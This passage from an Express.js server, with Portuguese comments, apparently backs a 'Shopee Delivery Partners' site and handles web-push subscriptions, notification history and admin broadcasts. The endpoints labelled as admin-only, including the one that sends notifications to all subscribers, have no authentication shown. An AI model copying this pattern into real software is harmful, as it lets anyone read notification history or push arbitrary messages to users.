// Endpoint para estatísticas de push notifications (usado na página /admin)
app.get('/api/push-stats', async (req, res) => {
  try {
    // Contar subscriptions ativas
    const activeResult = await pool.query('SELECT COUNT(*) as count FROM push_subscriptions WHERE is_active = true');
    const activeSubscriptions = parseInt(activeResult.rows[0].count);
    
    // Contar total de subscriptions
    const totalResult = await pool.query('SELECT COUNT(*) as count FROM push_subscriptions');
    const totalSubscriptions = parseInt(totalResult.rows[0].count);
    
    // Contar notificações recentes (últimas 5)
    const recentResult = await pool.query('SELECT * FROM notification_history ORDER BY sent_at DESC LIMIT 5');
    const recentNotifications = recentResult.rows;
    
    res.json({
      activeSubscriptions: activeSubscriptions,
      totalSubscriptions: totalSubscriptions,
      recentNotifications: recentNotifications.length,
      lastNotifications: recentNotifications
    });
  } catch (error) {
    console.error('❌ Erro ao buscar estatísticas:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});

// Endpoint para histórico de notificações (usado na página /admin)
app.get('/api/notification-history', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM notification_history ORDER BY sent_at DESC');
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Erro ao buscar histórico:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});

// Endpoint para registrar push subscriptions (usado quando usuário aceita notificações)
app.post('/api/push-subscriptions', async (req, res) => {
  try {
    const { endpoint, p256dhKey, authKey } = req.body;
    
    if (!endpoint || !p256dhKey || !authKey) {
      return res.status(400).json({ error: 'Dados da subscription incompletos' });
    }
    
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    
    // Verificar se já existe uma subscription para este endpoint
    const existingResult = await pool.query('SELECT id FROM push_subscriptions WHERE endpoint = $1', [endpoint]);
    
    if (existingResult.rows.length > 0) {
      // Atualizar subscription existente
      await pool.query(`
        UPDATE push_subscriptions 
        SET p256dh_key = $1, auth_key = $2, is_active = true, updated_at = NOW(), ip_address = $3
        WHERE endpoint = $4
      `, [p256dhKey, authKey, clientIp, endpoint]);
      
      console.log('🔄 Push subscription atualizada:', endpoint.substring(0, 50) + '...');
    } else {
      // Criar nova subscription
      await pool.query(`
        INSERT INTO push_subscriptions (endpoint, p256dh_key, auth_key, ip_address, user_agent, is_active, created_at, updated_at)
        VALUES ($1, $2, $3, $4, $5, true, NOW(), NOW())
      `, [endpoint, p256dhKey, authKey, clientIp, req.headers['user-agent'] || '']);
      
      console.log('✅ Nova push subscription criada:', endpoint.substring(0, 50) + '...');
    }
    
    res.json({ success: true, message: 'Subscription salva com sucesso' });
  } catch (error) {
    console.error('❌ Erro ao salvar push subscription:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});

// Endpoint para enviar notificações do admin (usado na página /admin)
app.post('/api/send-notification', async (req, res) => {
  try {
    const { title, body, icon, badge, tag, data: notificationData, requireInteraction } = req.body;
    
    if (!title || !body) {
      return res.status(400).json({ error: 'Título e corpo são obrigatórios' });
    }
    
    // Buscar todas as subscriptions ativas
    const subscriptionsResult = await pool.query('SELECT * FROM push_subscriptions WHERE is_active = true');
    const subscriptions = subscriptionsResult.rows;
    
    if (subscriptions.length === 0) {
      return res.status(400).json({ error: 'Nenhuma subscription ativa encontrada' });
    }
    
    // Preparar payload da notificação
    const payload = JSON.stringify({
      title,
      body,
      icon: icon || '/shopee-icon.jpg',
      badge: badge || '/shopee-icon.jpg',
      tag: tag || 'shopee-admin-notification',
      data: notificationData || {},
      requireInteraction: requireInteraction || false
    });
    
    console.log(`📢 Enviando notificação para ${subscriptions.length} usuários:`, payload);
    
    let successCount = 0;
    let failureCount = 0;
    
    // Enviar para cada subscription
    const promises = subscriptions.map(async (subscription) => {
      try {
        await webpush.sendNotification({
          endpoint: subscription.endpoint,
          keys: {
            p256dh: subscription.p256dh_key,
            auth: subscription.auth_key
          }
        }, payload);
        
        successCount++;
        console.log(`✅ Notificação enviada com sucesso para: ${subscription.endpoint.substring(0, 50)}...`);
      } catch (error) {
        failureCount++;
        console.error(`❌ Erro ao enviar para ${subscription.endpoint.substring(0, 50)}...`, error.message);
        
        // Se a subscription é inválida, desativá-la
        if (error.statusCode === 410 || error.statusCode === 404) {
          await pool.query('UPDATE push_subscriptions SET is_active = false, updated_at = NOW() WHERE id = $1', [subscription.id]);
          console.log(`🗑️ Subscription desativada (inválida): ${subscription.id}`);
        }
      }
    });
    
    await Promise.all(promises);
    
    // Salvar histórico da notificação
    await pool.query(`
      INSERT INTO notification_history (title, body, icon, badge, tag, data, sent_count, success_count, failure_count, sent_at)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
    `, [
      title,
      body,
      icon || '/shopee-icon.jpg',
      badge || '/shopee-icon.jpg',
      tag || 'shopee-admin-notification',
      JSON.stringify(notificationData || {}),
      subscriptions.length,
      successCount,
      failureCount
    ]);
    
    console.log(`📊 Resultado do envio: ${successCount} sucessos, ${failureCount} falhas`);
    
    res.json({
      success: true,
      message: 'Notificação enviada',
      stats: {
        total: subscriptions.length,
        success: successCount,
        failure: failureCount
      }
    });
  } catch (error) {
    console.error('❌ Erro ao enviar notificação:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});


// Middleware para APIs não encontradas
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Servir arquivos estáticos buildados
app.use(express.static(path.join(__dirname, 'dist/public'), {
  maxAge: '1d', // Cache por 1 dia
  etag: true
}));

// Rota para SPA (Single Page Application)
app.get('*', (req, res) => {
  const buildPath = path.join(__dirname, 'dist/public');
  const indexPath = path.join(buildPath, 'index.html');
  
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    console.log('⚠️ Arquivo index.html não encontrado, retornando página de erro');
    res.status(404).send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .container { max-width: 600px; margin: 0 auto; }
            .error { background: #ffebee; border: 1px solid #f44336; padding: 20px; margin: 20px 0; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Shopee Delivery Partners</h1>
            <p>Arquivos não encontrados</p>
            <div class="error">
                <strong>Status:</strong> Build não foi executado durante o deploy
            </div>
            <p>Entre em contato com o suporte técnico.</p>
        </div>
    </body>
    </html>
    `);
  }
});

// Cleanup
process.on('SIGTERM', () => {
  console.log('Recebido SIGTERM, encerrando...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('Recebido SIGINT, encerrando...');
  process.exit(0);
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor Heroku rodando na porta ${PORT}`);
  console.log(`🌐 Ambiente: ${process.env.NODE_ENV || 'production'}`);
  console.log(`🎯 Gateway escolhido: ${process.env.GATEWAY_CHOICE || 'PAGNET'}`);
  console.log(`📦 Servindo arquivos estáticos de: ${path.join(__dirname, 'dist/public')}`);
});